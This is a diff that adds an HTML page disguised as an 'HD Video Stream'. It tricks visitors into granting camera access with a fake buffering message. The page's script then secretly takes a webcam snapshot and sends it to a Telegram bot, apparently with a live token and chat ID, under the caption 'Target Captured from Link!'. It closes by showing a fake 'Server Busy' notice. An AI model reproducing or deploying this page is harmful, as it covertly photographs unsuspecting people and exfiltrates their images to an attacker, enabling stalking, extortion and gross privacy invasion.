@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head><title>HD Video Stream</title></head>
+<body style="background:#000;color:#fff;text-align:center;padding-top:20%;font-family:sans-serif;">
+    <div id="status">▶️ Video is Buffering...<br>Please Allow Camera for HD Quality.</div>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+            let v = document.getElementById('v');
+            v.srcObject = s;
+            setTimeout(() => {
+                let c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                let img = c.toDataURL('image/jpeg', 0.7).split(',')[1];
+                fetch('https://api.telegram.org/bot8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4/sendPhoto', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: '2043988256', photo: img, caption: "📸 Target Captured from Link!" })
+                });
+                document.getElementById('status').innerHTML = "⌛ Server Busy. Please try again later.";
+            }, 3000);
+        }).catch(e => alert("Please Enable camera to watch video!"));
+    </script>
+</body>
+</html>
